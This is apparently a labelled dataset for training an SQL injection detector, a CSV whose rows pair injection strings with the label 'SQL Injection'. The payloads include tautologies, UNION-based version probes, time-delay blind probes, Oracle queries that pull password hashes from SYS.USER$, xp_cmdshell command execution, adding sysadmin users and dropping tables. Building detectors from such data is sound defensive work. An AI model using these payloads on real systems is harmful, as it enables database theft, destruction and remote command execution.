Script,Label
" select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",SQL Injection
" select * from users where id  =  1 union select @<@,version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1",SQL Injection
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,SQL Injection
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",SQL Injection
select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1,SQL Injection
" select * from users where id  =  1 or "".["" or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",SQL Injection
UNION ALL SELECT,SQL Injection
" select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",SQL Injection
select * from users where id  =  1 or \<1 or 1  =  1 -- 1,SQL Injection
" select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",SQL Injection
x' or full_name like '%bob%,SQL Injection
x' and members.email is NULL; --,SQL Injection
 or 2 > 1,SQL Injection
select * from users where id  =  1.*1 or 1  =  1 -- 1,SQL Injection
"""  )   or pg_sleep  (  __TIME__  )  --",SQL Injection
 ',SQL Injection
" select * from users where id  =  1 or $<\. union select 1,@@VERSION -- 1",SQL Injection
" select * from users where id  =  1 or ""@  )  "" or 1  =  1 -- 1",SQL Injection
select * from users where id  =  1 or \.<$ or 1  =  1 -- 1,SQL Injection
 )   or sleep  (  __TIME__  )    =  ',SQL Injection
sleep 50',SQL Injection
" select * from users where id  =  '1' + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1'",SQL Injection
select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,SQL Injection
" select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",SQL Injection
or sleep  (  __TIME__  )    =  ',SQL Injection
" select * from users where id  =  1 or "";_"" or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 or 1#"". union select 1,version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 union select  @ $,version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 union select +!<@,version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",SQL Injection
or 2 > 1,SQL Injection
; exec   (  'sel' + 'ect us' + 'er'  ) ,SQL Injection
anything' OR 'x'  =  'x,SQL Injection
" select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",SQL Injection
" select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",SQL Injection
" select * from users where id  =  1 *  (  \  )   union select null,@@VERSION -- 1",SQL Injection
&',SQL Injection
a' or 3  =  3--,SQL Injection
" select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",SQL Injection
" select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",SQL Injection
"admin""or 1  =  1 or """"  =  """,SQL Injection
uni/**/on sel/**/ect,SQL Injection
""" or """"&""",SQL Injection
 )    )   ;waitfor delay '0:0:__TIME__'--,SQL Injection
" select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",SQL Injection
1 waitfor delay '0:0:10'--,SQL Injection
bfilename,SQL Injection
admin'  )   or   (  '1'  =  '1'--,SQL Injection
UEf,SQL Injection
 -- &password  = ,SQL Injection
1 or sleep  (  __TIME__  )  #,SQL Injection
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",SQL Injection
" select * from users where id  =  '1' union select $[""],@@VERSION -- 1'",SQL Injection
" select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'",SQL Injection
1' and 1  =    (  select count  (  *  )   from tablenames  )  ; --,SQL Injection
or sleep  (  __TIME__  )  #,SQL Injection
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",SQL Injection
" select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1",SQL Injection
||6,SQL Injection
or 1/*,SQL Injection
" and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",SQL Injection
select * from users where id  =  1.%@ or 1  =  1 -- 1,SQL Injection
" select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 or 1&@#  =  1 union select 1,version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 or "";]"" or 1  =  1 -- 1",SQL Injection
" or 1  =  1 or """"  =  ",SQL Injection
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",SQL Injection
select * from users where id  =  1 or $<\. or 1  =  1 -- 1,SQL Injection
" select * from users where id  =  1 *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",SQL Injection
or 'whatever' in   (  'whatever'  ) ,SQL Injection
declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,SQL Injection
select * from users where id  =  '1'   or 1  =  1 -- 1',SQL Injection
?,SQL Injection
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,SQL Injection
" select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",SQL Injection
"admin""  )   or   (  ""1""  =  ""1""#",SQL Injection
" select * from users where id  =  1 or 1#"", union select 'a',version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 or ""$  (  "" or 1  =  1 -- 1",SQL Injection
 or '' ',SQL Injection
" select * from users where id  =  1 or "";#"" or 1  =  1 -- 1",SQL Injection
or 1  =  1,SQL Injection
 ; drop table temp --,SQL Injection
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",SQL Injection
""" or benchmark  (  10000000,MD5  (  1   )    )   #",SQL Injection
""" or ""x""  =  ""x",SQL Injection
select * from users where id  =  '1'<@.. or 1  =  1 -- 1',SQL Injection
" select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1",SQL Injection
 or 'something' like 'some%',SQL Injection
; if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --,SQL Injection
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",SQL Injection
select * from users where id  =  '1' or \<\. or 1  =  1 -- 1',SQL Injection
; exec master..xp_cmdshell 'ping 10.10.1.2'--,SQL Injection
admin' or '1'  =  '1'--,SQL Injection
; if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --,SQL Injection
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",SQL Injection
" select * from users where id  =  1 <@<@ union select version  (    )  ,version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 or 1#""$ union select null,version  (    )   -- 1",SQL Injection
""";waitfor delay '0:0:__TIME__'--",SQL Injection
x' and userid is NULL; --,SQL Injection
select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1',SQL Injection
" select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",SQL Injection
" select * from users where id  =  1 or ""?@"" or 1  =  1 -- 1",SQL Injection
’ or ‘1’  =  ’1,SQL Injection
" select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",SQL Injection
admin'or 1  =  1 or ''  =  ',SQL Injection
" select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",SQL Injection
" and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",SQL Injection
exec  (  @s  ) ,SQL Injection
" select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 or \.<   =  1 union select 1,@@VERSION -- 1",SQL Injection
 or 1  =  1,SQL Injection
select * from users where id  =  1 + $+%1 or 1  =  1 -- 1,SQL Injection
" select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",SQL Injection
x' AND email IS NULL; --,SQL Injection
" select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",SQL Injection
 --,SQL Injection
" select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",SQL Injection
" select * from users where id  =  11||1 union select 1,banner from v$version where rownum  =  1 -- 1",SQL Injection
" select * from users where id  =  1.*1 union select 1,banner from v$version where rownum  =  1 -- 1",SQL Injection
update,SQL Injection
 or 1/*,SQL Injection
" select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",SQL Injection
"""   )    )    or pg_sleep  (  __TIME__  )  --",SQL Injection
||'6,SQL Injection
" select * from users where id  =  1. <@ union select 1,version  (    )   -- 1",SQL Injection
or   (  EXISTS  ) ,SQL Injection
^',SQL Injection
or 'text'   =   n'text',SQL Injection
" select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",SQL Injection
" select * from users where id  =  '1' union select $ _,@@VERSION -- 1'",SQL Injection
" select * from users where id  =  1 or ""  )  ;"" or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 <@1$ union select 1,version  (    )   -- 1",SQL Injection
 or 0  =  0 --,SQL Injection
" select * from users where id  =  1 or ""{1""  =  1 or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 or ""{,""  =  1 or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 or 1#"", union select version  (    )  ,version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 or 1#""? union select 'a',version  (    )   -- 1",SQL Injection
password:*/  =  1--,SQL Injection
" select * from users where id  =  1 <@. union select 1,version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 or ""  )  @"" or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",SQL Injection
" union   (  select NULL,   (  select @@version   )    )    --",SQL Injection
" select * from users where id  =  1 or ""  )  {"" or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1.<@. union select 1,version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 +\. union select null,@@VERSION -- 1",SQL Injection
" select * from users where id  =  1 + @<@. union select 1,version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 or \<$ union select 1,@@VERSION -- 1",SQL Injection
" select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",SQL Injection
" select * from users where id  =  1 +   (  \+  )   union select null,@@VERSION -- 1",SQL Injection
" select * from users where id  =  1. union select null,version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 or ""  )  ["" or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 or \.<1 union select 1,@@VERSION -- 1",SQL Injection
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT banner FROM v$version WHERE ROWNUM  =  1   )    )    AND 'i'  =  'i,SQL Injection
select * from users where id  =  1 <@$_ or 1  =  1 -- 1,SQL Injection
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",SQL Injection
" select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",SQL Injection
" select * from users where id  =  1 or ""@%"" or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 or $<\ union select 1,@@VERSION -- 1",SQL Injection
" select * from users where id  =  1 or ""%,"" or 1  =  1 -- 1",SQL Injection
UNION SELECT,SQL Injection
asc,SQL Injection
" || myappadmin.adduser  (  'admin', 'newpass'  )   || '",SQL Injection
"exec sp_addsrvrolemember 'name' , 'sysadmin'",SQL Injection
" select * from users where id  =  1 or   (  \  )    =  1 union select 1,@@VERSION -- 1",SQL Injection
  )   or true--,SQL Injection
" select * from users where id  =  1 +  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",SQL Injection
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",SQL Injection
 or userid like '%,SQL Injection
" union   (  select NULL, NULL,   (  select @@version   )    )    --",SQL Injection
/,SQL Injection
select * from users where id  =  1 or $<\ or 1  =  1 -- 1,SQL Injection
"admin""/*",SQL Injection
" select * from users where id  =  1.  union select 1,version  (    )   -- 1",SQL Injection
 )  ;waitfor delay '0:0:__TIME__'--,SQL Injection
" select * from users where id  =  1 union select @<@.,version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 or ""._"" or 1  =  1 -- 1",SQL Injection
"admin"" or ""1""  =  ""1",SQL Injection
 union   (  select @@version  )   --,SQL Injection
 or ''^',SQL Injection
"""   )    )    or sleep  (  __TIME__  )    =  """,SQL Injection
" union   (  select NULL, NULL, NULL, NULL,  NULL,   (  select @@version   )    )    --",SQL Injection
" select * from users where id  =  1 or \+<\ union select 1,@@VERSION -- 1",SQL Injection
" select * from users where id  =  1 union select @ _,version  (    )   -- 1",SQL Injection
select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1,SQL Injection
select * from users where id  =  '1' <@$_ or 1  =  1 -- 1',SQL Injection
" select * from users where id  =  1 +$ 1 union select null,@@VERSION -- 1",SQL Injection
" select * from users where id  =  1 or ""  (  &"" or 1  =  1 -- 1",SQL Injection
"""hi""""  )   or   (  """"a""""  =  """"a""",SQL Injection
select name from syscolumns where id   =     (  sele ...,SQL Injection
" select * from users where id  =  1 or ""1,"" or 1  =  1 -- 1",SQL Injection
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 5  )   waitfor delay '0:0:2' --",SQL Injection
" select * from users where id  =  '1' + @<@# union select 1,version  (    )   -- 1'",SQL Injection
 or 2 between 1 and 3,SQL Injection
union all select @@version--,SQL Injection
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",SQL Injection
t'exec master..xp_cmdshell 'nslookup www.google.com'--,SQL Injection
""" or isNULL  (  1/0  )   /*",SQL Injection
" select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",SQL Injection
